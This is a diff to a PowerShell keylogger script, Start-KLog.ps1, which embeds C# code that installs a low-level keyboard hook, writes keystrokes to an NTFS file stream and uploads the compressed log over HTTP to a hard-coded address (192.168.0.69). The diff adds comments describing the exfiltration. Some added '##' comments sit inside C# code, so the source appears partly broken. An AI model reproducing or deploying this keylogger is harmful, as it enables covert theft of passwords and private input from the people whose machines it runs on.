@@ -1,4 +1,11 @@
-﻿Add-Type -TypeDefinition @"
+﻿## Author: Joncarlo Alvarado
+
+## Start-KLog.ps1
+
+## Logs keystrokes to NTFS file stream and exfilltrates saif log
+## every 30 seconds through a HTTP POST message.
+
+Add-Type -TypeDefinition @"
 using Microsoft.Win32.SafeHandles;
 using System;
 using System.IO;
@@ -32,7 +39,7 @@ namespace KeyLogger {
         }
 
         private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
-
+       
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                 int vkCode = Marshal.ReadInt32(lParam);
@@ -91,11 +98,14 @@ namespace KeyLogger {
 
             fh.Close();
 
+            ## exfiltrate logged keystrokes trough HTTP
             using(WebClient client = new WebClient()) {
                 client.UploadFile("192.168.0.69", "C:\\Users\\Jace\\exf.gz");
             }
 
         }
+
+        ## Importing system calls to be used.
 
         [DllImport("user32.dll")]
         private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
@@ -117,6 +127,8 @@ namespace KeyLogger {
 
     }
 }
+
+## enum objects made with purpose of improving code readability
 
 [Flags]
 public enum EFileAccess : uint
